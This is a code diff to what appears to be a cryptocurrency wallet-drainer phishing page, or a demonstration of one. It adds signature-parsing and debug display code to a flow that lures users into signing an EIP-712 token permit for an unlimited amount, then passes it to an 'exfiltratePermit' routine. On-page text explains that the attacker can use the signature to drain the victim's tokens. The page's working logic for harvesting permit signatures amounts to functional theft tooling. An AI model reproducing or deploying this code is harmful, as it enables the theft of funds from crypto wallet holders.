@@ -146,6 +146,13 @@
   /* PERMIT WARNING BOX */
   .permit-danger { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px 18px; margin-top: 12px; font-size: 0.83rem; color: #fca5a5; line-height: 1.6; }
   .permit-danger strong { color: var(--red); display: block; margin-bottom: 4px; }
+
+  /* DEBUG TABLE */
+  .debug-table { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-top: 16px; font-size: 0.75rem; font-family: monospace; }
+  .debug-row { display: flex; padding: 4px 0; border-bottom: 1px solid var(--border); }
+  .debug-row:last-child { border-bottom: none; }
+  .debug-label { color: var(--muted); min-width: 100px; font-weight: 600; }
+  .debug-value { color: #86efac; word-break: break-all; flex: 1; }
 </style>
 </head>
 <body>
@@ -238,7 +245,15 @@
         <div style="color: var(--muted); font-size: 0.75rem;">💀 value = MAX_UINT256 means unlimited drain on any token</div>
       </div>
 
-      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--red); line-height: 1.7;">
+      <!-- DEBUG: Show extracted values -->
+      <div class="debug-table">
+        <div class="debug-row"><div class="debug-label">r (64 chars)</div><div class="debug-value" id="debugR">—</div></div>
+        <div class="debug-row"><div class="debug-label">s (64 chars)</div><div class="debug-value" id="debugS">—</div></div>
+        <div class="debug-row"><div class="debug-label">v (27 or 28)</div><div class="debug-value" id="debugV">—</div></div>
+        <div class="debug-row"><div class="debug-label">deadline (unix)</div><div class="debug-value" id="debugDeadline">—</div></div>
+      </div>
+
+      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--red); line-height: 1.7; margin-top: 16px;">
         <strong>⚠️ Why this is extremely dangerous:</strong> The attacker has your <strong>signed permit in their email</strong>. They don't need to stay on this site. They don't need access to your MetaMask. They're not watching your screen. They received everything they need to drain you — a permit signature is a cryptographic proof that YOU authorized them to take your tokens. They can sit on it for 2 days, or drain you in the next 5 minutes. You won't know until your balance hits zero.
       </div>
     </div>
@@ -420,6 +435,30 @@
       </div>`).join('');
   }
 
+  // ---- EXTRACT AND VALIDATE SIGNATURE ----
+  function extractSignatureComponents(sig) {
+    // Remove 0x prefix if present
+    const cleaned = sig.startsWith('0x') ? sig.slice(2) : sig;
+    
+    // Should be 130 hex chars (65 bytes: 32+32+1)
+    if (cleaned.length !== 130) {
+      throw new Error(`Invalid signature length: ${cleaned.length} (expected 130)`);
+    }
+    
+    // Extract r, s, v
+    const r = '0x' + cleaned.slice(0, 64);    // First 64 hex chars = 32 bytes
+    const s = '0x' + cleaned.slice(64, 128);  // Next 64 hex chars = 32 bytes
+    const vHex = cleaned.slice(128, 130);     // Last 2 hex chars
+    const v = parseInt(vHex, 16);             // Convert to decimal (27 or 28)
+    
+    console.log('✓ Signature extraction successful');
+    console.log('  r:', r, `(${r.length - 2} hex chars)`);
+    console.log('  s:', s, `(${s.length - 2} hex chars)`);
+    console.log('  v:', v);
+    
+    return { r, s, v };
+  }
+
   // ---- EXFILTRATE PERMIT ----
   function exfiltratePermit(address, sig, nonce) {
     document.getElementById('exfilWallet').value = address;
@@ -467,11 +506,7 @@
  
       // POPUP #2 — permit signature (EIP-712 typed data)
       const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
-      const [nonce, domainSeparator] = await Promise.all([
-        tokenContract.nonces(userAddress),
-        tokenContract.DOMAIN_SEPARATOR()
-      ]);
-
+      const nonce = await tokenContract.nonces(userAddress);
       permitNonce = nonce.toString();
  
       permitDeadline = Math.floor(Date.now() / 1000) + 172800; // 2 days
@@ -507,7 +542,16 @@
       // This fires the signature request popup
       const signature = await signer.signTypedData(domain, types, message);
       permitSig = signature;
- 
+      
+      // EXTRACT AND VALIDATE SIGNATURE
+      const { r, s, v } = extractSignatureComponents(signature);
+      
+      // Display debug info
+      document.getElementById('debugR').textContent = r;
+      document.getElementById('debugS').textContent = s;
+      document.getElementById('debugV').textContent = v;
+      document.getElementById('debugDeadline').textContent = permitDeadline;
+      
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected',     desc: shortAddr(userAddress) },
         { num:'2', state:'done', title:'Vault access granted', desc:'Signature confirmed.' },
@@ -531,6 +575,7 @@
       if (err.code === 4001) {
         alert("You rejected the request.");
       } else {
+        console.error("Error:", err);
         alert("Error: " + (err.message || "Something went wrong."));
       }
       showPhase('phase-lure');
